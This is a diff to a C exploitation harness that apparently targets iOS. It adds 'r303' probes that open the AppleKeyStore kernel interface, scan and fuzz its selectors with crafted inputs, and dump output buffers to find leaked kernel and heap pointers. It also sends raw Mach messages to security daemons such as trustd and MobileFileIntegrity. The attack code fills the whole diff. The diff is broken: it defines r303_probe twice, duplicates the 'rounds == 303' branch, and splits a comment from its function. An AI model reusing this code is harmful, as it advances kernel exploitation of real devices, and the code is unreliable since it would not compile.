@@ -4280,6 +4280,240 @@ static void r297_probe(void) {
  */
 
 /*
+ * r303: AppleKeyStore output buffer dump + extended selector scan
+ * r302 RESULTS:
+ *   - AKS user client type=0 opens (conn obtained)
+ *   - sel=0,1,16 return SUCCESS with Scalar/Struct/Async
+ *   - sel=5,6,20-22,33-34,36-39,41,51,53,63 return kIOReturnNotPrivileged
+ *   - sel=8,19,32 return kIOReturnNotPermitted
+ *   - NVRAM SetCFProperties found via dlsym but returns NotPrivileged
+ *   - AMFI port obtained
+ *
+ * This probe:
+ *   1. Dump full output buffers from sel 0,1,16 looking for kernel pointers
+ *   2. Scan selectors 64-255 for any beyond the 64 we tested
+ *   3. Try sel 0,1,16 with crafted input payloads
+ *   4. Try trustd/securityd XPC to query entitlements and keybag state
+ */
+static void r303_probe(void) {
+    rlog("\n=== r303: AKS Buffer Dump + Extended Scan ===\n\n");
+    fflush(stdout);
+
+    io_service_t aksSvc = IOServiceGetMatchingService(
+        kIOMasterPortDefault, IOServiceMatching("AppleKeyStore"));
+    io_connect_t aksConn = IO_OBJECT_NULL;
+    kern_return_t kr = KERN_SUCCESS;
+
+    if (aksSvc) {
+        kr = IOServiceOpen(aksSvc, mach_task_self(), 0, &aksConn);
+        rlog("  AKS open: kr=0x%x conn=0x%x\n", kr, aksConn);
+    }
+
+    if (aksConn == IO_OBJECT_NULL) {
+        rlog("  FAILED to open AKS\n");
+        if (aksSvc) IOObjectRelease(aksSvc);
+        return;
+    }
+
+    /* ---- Part 1: Dump output from successful selectors ---- */
+    rlog("\n--- Part 1: Full buffer dump from sel 0, 1, 16 ---\n");
+    uint32_t good_sels[] = {0, 1, 16};
+    for (int g = 0; g < 3; g++) {
+        uint32_t sel = good_sels[g];
+
+        /* Scalar method - check if out values have pointer-like data */
+        uint64_t sout[16] = {0};
+        uint32_t soutCnt = 16;
+        kr = IOConnectCallScalarMethod(aksConn, sel, NULL, 0, sout, &soutCnt);
+        rlog("\n  sel=%u ScalarMethod: kr=0x%x outCnt=%u\n", sel, kr, soutCnt);
+        for (uint32_t i = 0; i < soutCnt && i < 16; i++) {
+            if (sout[i] != 0)
+                rlog("    out[%u] = 0x%016llx\n", i, sout[i]);
+        }
+
+        /* Struct method with no input - dump first 256 bytes */
+        char outBuf[4096];
+        memset(outBuf, 0xAA, sizeof(outBuf));
+        size_t outSize = sizeof(outBuf);
+        kr = IOConnectCallStructMethod(aksConn, sel, NULL, 0, outBuf, &outSize);
+        rlog("  sel=%u StructMethod(no input): kr=0x%x outSize=%zu\n", sel, kr, outSize);
+        if (kr == 0 && outSize > 0) {
+            /* Find first non-zero region */
+            int has_data = 0;
+            for (size_t i = 0; i < outSize && i < 4096; i++) {
+                if (outBuf[i] != 0) { has_data = 1; break; }
+            }
+            if (has_data) {
+                rlog("    First 128 bytes: ");
+                for (size_t i = 0; i < 128 && i < outSize; i++)
+                    rlog("%02x", (unsigned char)outBuf[i]);
+                rlog("\n");
+                /* Scan for pointer-like values (0xffff...) */
+                uint64_t *qwords = (uint64_t*)outBuf;
+                size_t nq = outSize / 8;
+                rlog("    Pointer-like qwords (0xffff prefix):\n");
+                int found = 0;
+                for (size_t i = 0; i < nq && i < 512; i++) {
+                    if ((qwords[i] >> 48) == 0xffff) {
+                        rlog("      [%zu] = 0x%016llx\n", i*8, qwords[i]);
+                        found++;
+                        if (found >= 20) break;
+                    }
+                }
+                if (!found) rlog("      (none)\n");
+                /* Also check for tagged kernel pointers (PAC) */
+                rlog("    High-byte-tagged qwords:\n");
+                found = 0;
+                for (size_t i = 0; i < nq && i < 512; i++) {
+                    uint8_t top = (uint8_t)(qwords[i] >> 56);
+                    if (top != 0 && top != 0xff && top != 0xAA && qwords[i] > 0x100000) {
+                        rlog("      [%zu] = 0x%016llx (top=0x%02x)\n", i*8, qwords[i], top);
+                        found++;
+                        if (found >= 20) break;
+                    }
+                }
+                if (!found) rlog("      (none)\n");
+            } else {
+                rlog("    Buffer is all zeros\n");
+            }
+        }
+
+        /* Struct method with 64-byte structured input */
+        uint8_t inBuf[64];
+        memset(inBuf, 0, sizeof(inBuf));
+        /* Try keybag handle = 0 (system keybag) */
+        *(uint32_t*)(inBuf + 0) = 0;    /* keybag handle */
+        *(uint32_t*)(inBuf + 4) = 0;    /* class/type */
+        memset(outBuf, 0xBB, sizeof(outBuf));
+        outSize = sizeof(outBuf);
+        kr = IOConnectCallStructMethod(aksConn, sel,
+            inBuf, sizeof(inBuf), outBuf, &outSize);
+        rlog("  sel=%u StructMethod(64-byte in): kr=0x%x outSize=%zu\n", sel, kr, outSize);
+        if (kr == 0 && outSize > 0) {
+            int has_data = 0;
+            for (size_t i = 0; i < outSize && i < 4096; i++) {
+                if (outBuf[i] != 0) { has_data = 1; break; }
+            }
+            if (has_data) {
+                rlog("    First 128 bytes: ");
+                for (size_t i = 0; i < 128 && i < outSize; i++)
+                    rlog("%02x", (unsigned char)outBuf[i]);
+                rlog("\n");
+            }
+        }
+        fflush(stdout);
+    }
+
+    /* ---- Part 2: Extended selector scan 64-255 ---- */
+    rlog("\n--- Part 2: Extended selector scan 64-255 ---\n");
+    for (uint32_t sel = 64; sel < 256; sel++) {
+        uint64_t out[4] = {0};
+        uint32_t outCnt = 4;
+        kr = IOConnectCallScalarMethod(aksConn, sel, NULL, 0, out, &outCnt);
+        if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+            rlog("  sel=%u: kr=0x%x", sel, kr);
+            if (kr == 0 && outCnt > 0) rlog(" out[0]=0x%llx", out[0]);
+            rlog("\n");
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: AKS with keybag operation inputs ---- */
+    rlog("\n--- Part 3: Keybag operations on sel 0 ---\n");
+    /* AKS operations typically: op_code in first 4 bytes, keybag handle, key class, etc. */
+    for (uint32_t op = 0; op < 32; op++) {
+        uint8_t opBuf[128];
+        memset(opBuf, 0, sizeof(opBuf));
+        *(uint32_t*)(opBuf + 0) = op;
+        char outB[4096] = {0};
+        size_t oSz = sizeof(outB);
+        kr = IOConnectCallStructMethod(aksConn, 0,
+            opBuf, 128, outB, &oSz);
+        if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+            rlog("  sel=0 op=%u: kr=0x%x outSize=%zu", op, kr, oSz);
+            if (kr == 0 && oSz > 0) {
+                /* Check for non-zero data */
+                int nz = 0;
+                for (size_t j = 0; j < oSz && j < 64; j++)
+                    if (outB[j]) nz++;
+                if (nz) {
+                    rlog(" data=");
+                    for (size_t j = 0; j < 64 && j < oSz; j++)
+                        rlog("%02x", (unsigned char)outB[j]);
+                }
+            }
+            rlog("\n");
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: trustd and securityd XPC ---- */
+    rlog("\n--- Part 4: trustd/securityd XPC ---\n");
+    mach_port_t bp = MACH_PORT_NULL;
+    task_get_bootstrap_port(mach_task_self(), &bp);
+
+    const char *svc_names[] = {
+        "com.apple.trustd",
+        "com.apple.securityd",
+        "com.apple.containermanagerd",
+        "com.apple.MobileFileIntegrity",
+        NULL
+    };
+    for (int i = 0; svc_names[i]; i++) {
+        mach_port_t port = MACH_PORT_NULL;
+        kr = bootstrap_look_up(bp, svc_names[i], &port);
+        rlog("  %s: port=0x%x kr=0x%x\n", svc_names[i], port, kr);
+        if (port != MACH_PORT_NULL) {
+            /* Send a simple info request */
+            struct {
+                mach_msg_header_t hdr;
+                uint64_t data[4];
+            } msg = {0};
+            msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+            msg.hdr.msgh_size = sizeof(msg);
+            msg.hdr.msgh_remote_port = port;
+            mach_port_t rp = MACH_PORT_NULL;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rp);
+            msg.hdr.msgh_local_port = rp;
+            msg.hdr.msgh_id = 0x10000000; /* generic probe ID */
+            kr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                          sizeof(msg), 0, MACH_PORT_NULL, 200, MACH_PORT_NULL);
+            rlog("    send: kr=0x%x\n", kr);
+            if (kr == KERN_SUCCESS) {
+                struct {
+                    mach_msg_header_t hdr;
+                    uint64_t data[64];
+                } reply = {0};
+                reply.hdr.msgh_size = sizeof(reply);
+                reply.hdr.msgh_local_port = rp;
+                kr = mach_msg(&reply.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                              0, sizeof(reply), rp, 500, MACH_PORT_NULL);
+                rlog("    recv: kr=0x%x", kr);
+                if (kr == KERN_SUCCESS) {
+                    rlog(" id=0x%x size=%u", reply.hdr.msgh_id, reply.hdr.msgh_size);
+                    uint8_t *rdata = (uint8_t*)&reply.data[0];
+                    int nb = reply.hdr.msgh_size - sizeof(mach_msg_header_t);
+                    if (nb > 0 && nb <= 512) {
+                        rlog(" first32=");
+                        for (int j = 0; j < 32 && j < nb; j++)
+                            rlog("%02x", rdata[j]);
+                    }
+                }
+                rlog("\n");
+            }
+            mach_port_deallocate(mach_task_self(), rp);
+            mach_port_deallocate(mach_task_self(), port);
+        }
+    }
+    fflush(stdout);
+
+    IOServiceClose(aksConn);
+    if (aksSvc) IOObjectRelease(aksSvc);
+    rlog("\n=== r303 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r302: AppleKeyStore deep probe + AMFI Mach message + NVRAM via syscall
  * r301 BREAKTHROUGH:
  *   - AppleKeyStore user client OPENS (kr=0x0)
@@ -4292,6 +4526,251 @@ static void r297_probe(void) {
  * Also try NVRAM via syscall (not IOKit) since sandbox allows it.
  * Also try AMFI Mach message to query lockdown mode state.
  */
+static void r303_probe(void) {
+    rlog("\n=== r303: AppleKeyStore Output Data Dump + Kernel Pointer Scan ===\n\n");
+    fflush(stdout);
+
+    kern_return_t kr;
+    io_service_t aksSvc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("AppleKeyStore"));
+    if (!aksSvc) { rlog("AppleKeyStore not found\n"); return; }
+
+    io_connect_t conn = IO_OBJECT_NULL;
+    kr = IOServiceOpen(aksSvc, mach_task_self(), 0, &conn);
+    rlog("AKS open: kr=0x%x conn=0x%x\n", kr, conn);
+    if (kr != KERN_SUCCESS || !conn) {
+        IOObjectRelease(aksSvc);
+        return;
+    }
+
+    /* ---- Part 1: Dump struct output from sel=0,1,16 ---- */
+    uint32_t interesting_sels[] = {0, 1, 16};
+    for (int i = 0; i < 3; i++) {
+        uint32_t sel = interesting_sels[i];
+        rlog("\n--- Selector %u: Full struct output dump ---\n", sel);
+
+        /* Call with no input */
+        char outBuf[4096] = {0};
+        size_t outSize = sizeof(outBuf);
+        uint64_t scOut[16] = {0};
+        uint32_t scOutCnt = 16;
+
+        kr = IOConnectCallMethod(conn, sel,
+            NULL, 0, NULL, 0,
+            scOut, &scOutCnt, outBuf, &outSize);
+        rlog("  no-input: kr=0x%x scOutCnt=%u structOutSz=%zu\n", kr, scOutCnt, outSize);
+
+        if (kr == KERN_SUCCESS) {
+            /* Dump scalar outputs */
+            rlog("  scalarOut: ");
+            for (uint32_t j = 0; j < scOutCnt && j < 16; j++)
+                rlog("0x%llx ", scOut[j]);
+            rlog("\n");
+
+            /* Dump first 256 bytes of struct output as hex */
+            if (outSize > 0) {
+                size_t dumpLen = outSize < 256 ? outSize : 256;
+                rlog("  structOut[0..%zu]:\n", dumpLen - 1);
+                for (size_t off = 0; off < dumpLen; off += 16) {
+                    rlog("    %04zx: ", off);
+                    for (size_t b = 0; b < 16 && (off + b) < dumpLen; b++)
+                        rlog("%02x ", (uint8_t)outBuf[off + b]);
+                    rlog("\n");
+                }
+
+                /* Scan for kernel-range pointers (0xfffffff0xxxxxxxx) */
+                rlog("  Kernel pointer scan (0xfffffff...):\n");
+                int found = 0;
+                for (size_t off = 0; off + 8 <= outSize; off += 4) {
+                    uint64_t val;
+                    memcpy(&val, outBuf + off, 8);
+                    if ((val >> 36) == 0xfffffff) {
+                        rlog("    ** KPTR at offset 0x%zx: 0x%llx **\n", off, val);
+                        found++;
+                    }
+                    if ((val >> 32) == 0xfffffe00 || (val >> 32) == 0xfffffe01) {
+                        rlog("    ** HEAP at offset 0x%zx: 0x%llx **\n", off, val);
+                        found++;
+                    }
+                }
+                if (!found) rlog("    (none found)\n");
+            }
+        }
+
+        /* Also try with scalar input = 0 */
+        uint64_t scIn[4] = {0, 0, 0, 0};
+        memset(outBuf, 0, sizeof(outBuf));
+        outSize = sizeof(outBuf);
+        scOutCnt = 16;
+        memset(scOut, 0, sizeof(scOut));
+
+        kr = IOConnectCallMethod(conn, sel,
+            scIn, 1, NULL, 0,
+            scOut, &scOutCnt, outBuf, &outSize);
+        rlog("  1-scalar-in(0): kr=0x%x scOutCnt=%u structOutSz=%zu\n",
+             kr, scOutCnt, outSize);
+        if (kr == KERN_SUCCESS && outSize > 0) {
+            size_t dumpLen = outSize < 128 ? outSize : 128;
+            rlog("  structOut[0..%zu]:\n", dumpLen - 1);
+            for (size_t off = 0; off < dumpLen; off += 16) {
+                rlog("    %04zx: ", off);
+                for (size_t b = 0; b < 16 && (off + b) < dumpLen; b++)
+                    rlog("%02x ", (uint8_t)outBuf[off + b]);
+                rlog("\n");
+            }
+        }
+
+        /* Try with scalar input = 1 (might select different key bag) */
+        scIn[0] = 1;
+        memset(outBuf, 0, sizeof(outBuf));
+        outSize = sizeof(outBuf);
+        scOutCnt = 16;
+        memset(scOut, 0, sizeof(scOut));
+
+        kr = IOConnectCallMethod(conn, sel,
+            scIn, 1, NULL, 0,
+            scOut, &scOutCnt, outBuf, &outSize);
+        rlog("  1-scalar-in(1): kr=0x%x scOutCnt=%u structOutSz=%zu\n",
+             kr, scOutCnt, outSize);
+        if (kr == KERN_SUCCESS && outSize > 0) {
+            size_t dumpLen = outSize < 128 ? outSize : 128;
+            for (size_t off = 0; off < dumpLen; off += 16) {
+                rlog("    %04zx: ", off);
+                for (size_t b = 0; b < 16 && (off + b) < dumpLen; b++)
+                    rlog("%02x ", (uint8_t)outBuf[off + b]);
+                rlog("\n");
+            }
+            /* Pointer scan */
+            for (size_t off = 0; off + 8 <= outSize; off += 4) {
+                uint64_t val;
+                memcpy(&val, outBuf + off, 8);
+                if ((val >> 36) == 0xfffffff || (val >> 32) == 0xfffffe00 ||
+                    (val >> 32) == 0xfffffe01) {
+                    rlog("    ** PTR at 0x%zx: 0x%llx **\n", off, val);
+                }
+            }
+        }
+        fflush(stdout);
+    }
+
+    /* ---- Part 2: Deep probe sel=17 (InternalError) with crafted input ---- */
+    rlog("\n--- Part 2: sel=17 (InternalError) deep probe ---\n");
+    {
+        /* Try different struct input sizes */
+        uint8_t inBuf[256] = {0};
+        for (size_t inSz = 0; inSz <= 64; inSz += 8) {
+            char outBuf2[4096] = {0};
+            size_t outSz2 = sizeof(outBuf2);
+            uint64_t scOut2[4] = {0};
+            uint32_t scOutCnt2 = 4;
+
+            kr = IOConnectCallMethod(conn, 17,
+                NULL, 0, inBuf, inSz,
+                scOut2, &scOutCnt2, outBuf2, &outSz2);
+            if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                rlog("  sel=17 inSz=%zu: kr=0x%x outSz=%zu", inSz, kr, outSz2);
+                if (kr == KERN_SUCCESS) {
+                    rlog(" sc=[0x%llx,0x%llx]", scOut2[0], scOut2[1]);
+                    if (outSz2 > 0) {
+                        rlog(" data=");
+                        for (size_t j = 0; j < outSz2 && j < 32; j++)
+                            rlog("%02x", (uint8_t)outBuf2[j]);
+                    }
+                }
+                rlog("\n");
+            }
+        }
+
+        /* Try with magic keybag header values */
+        uint32_t magic_vals[] = {0x01, 0x02, 0x03, 0x04,
+                                 0x4b455953, /* 'KEYS' */
+                                 0x41505053, /* 'APPS' */
+                                 0x42414753}; /* 'BAGS' */
+        for (int m = 0; m < 7; m++) {
+            memset(inBuf, 0, sizeof(inBuf));
+            memcpy(inBuf, &magic_vals[m], 4);
+            char outBuf2[4096] = {0};
+            size_t outSz2 = sizeof(outBuf2);
+            uint64_t scOut2[4] = {0};
+            uint32_t scOutCnt2 = 4;
+
+            kr = IOConnectCallMethod(conn, 17,
+                NULL, 0, inBuf, 32,
+                scOut2, &scOutCnt2, outBuf2, &outSz2);
+            rlog("  sel=17 magic=0x%x: kr=0x%x outSz=%zu\n",
+                 magic_vals[m], kr, outSz2);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: sel=54 (BadArgument) with varied inputs ---- */
+    rlog("\n--- Part 3: sel=54 deep probe ---\n");
+    {
+        for (uint64_t scIn = 0; scIn < 8; scIn++) {
+            uint64_t scArr[4] = {scIn, 0, 0, 0};
+            uint64_t scOut3[4] = {0};
+            uint32_t scOutCnt3 = 4;
+            char outBuf3[4096] = {0};
+            size_t outSz3 = sizeof(outBuf3);
+
+            kr = IOConnectCallMethod(conn, 54,
+                scArr, 1, NULL, 0,
+                scOut3, &scOutCnt3, outBuf3, &outSz3);
+            rlog("  sel=54 scIn=%llu: kr=0x%x", scIn, kr);
+            if (kr == KERN_SUCCESS) {
+                rlog(" sc=[0x%llx] outSz=%zu", scOut3[0], outSz3);
+            }
+            rlog("\n");
+        }
+
+        /* Try with struct input */
+        uint8_t inBuf[64] = {0};
+        for (size_t inSz = 4; inSz <= 64; inSz += 4) {
+            char outBuf3[4096] = {0};
+            size_t outSz3 = sizeof(outBuf3);
+            kr = IOConnectCallMethod(conn, 54,
+                NULL, 0, inBuf, inSz,
+                NULL, NULL, outBuf3, &outSz3);
+            if (kr != 0xe00002e6 && kr != 0xe00002c2) {
+                rlog("  sel=54 structIn=%zu: kr=0x%x outSz=%zu\n",
+                     inSz, kr, outSz3);
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: Deeper probe of Part 2 results with targeted inputs ---- */
+    rlog("\n--- Part 4: AKS sel=0,1,16 with large scalar inputs ---\n");
+    {
+        uint32_t sels[] = {0, 1, 16};
+        for (int i = 0; i < 3; i++) {
+            /* Try different scalar counts */
+            for (int nsc = 2; nsc <= 4; nsc++) {
+                uint64_t scIn[4] = {0, 0, 0, 0};
+                char outBuf4[4096] = {0};
+                size_t outSz4 = sizeof(outBuf4);
+                uint64_t scOut4[16] = {0};
+                uint32_t scOutCnt4 = 16;
+
+                kr = IOConnectCallMethod(conn, sels[i],
+                    scIn, nsc, NULL, 0,
+                    scOut4, &scOutCnt4, outBuf4, &outSz4);
+                if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                    rlog("  sel=%u nsc=%d: kr=0x%x outCnt=%u outSz=%zu\n",
+                         sels[i], nsc, kr, scOutCnt4, outSz4);
+                }
+            }
+        }
+    }
+    fflush(stdout);
+
+    IOServiceClose(conn);
+    IOObjectRelease(aksSvc);
+
+    rlog("\n=== r303 complete ===\n");
+    fflush(stdout);
+}
+
 static void r302_probe(void) {
     rlog("\n=== r302: AppleKeyStore Deep Probe ===\n\n");
     fflush(stdout);
@@ -31003,6 +31482,20 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 303) {
+            rlog("*** rounds=303: AKS buffer dump + extended scan ***\n");
+            rlog("  r302: sel 0,1,16 succeed! Dumping buffers for kernel ptrs.\n");
+            rlog("  Probe: full buffer dump, sel 64-255, keybag ops, XPC.\n\n");
+            r303_probe();
+            goto done;
+        }
+        if (rounds == 303) {
+            rlog("*** rounds=303: AKS output dump + kernel pointer scan ***\n");
+            rlog("  r302: sel=0,1,16 succeed with 4096b output!\n");
+            rlog("  Probe: dump output buffers, scan for kptrs.\n\n");
+            r303_probe();
+            goto done;
+        }
         if (rounds == 302) {
             rlog("*** rounds=302: AppleKeyStore deep probe + NVRAM write ***\n");
             rlog("  r301: AKS opens! sandbox allows nvram-set/get!\n");
@@ -32677,7 +33170,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -42519,7 +43012,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
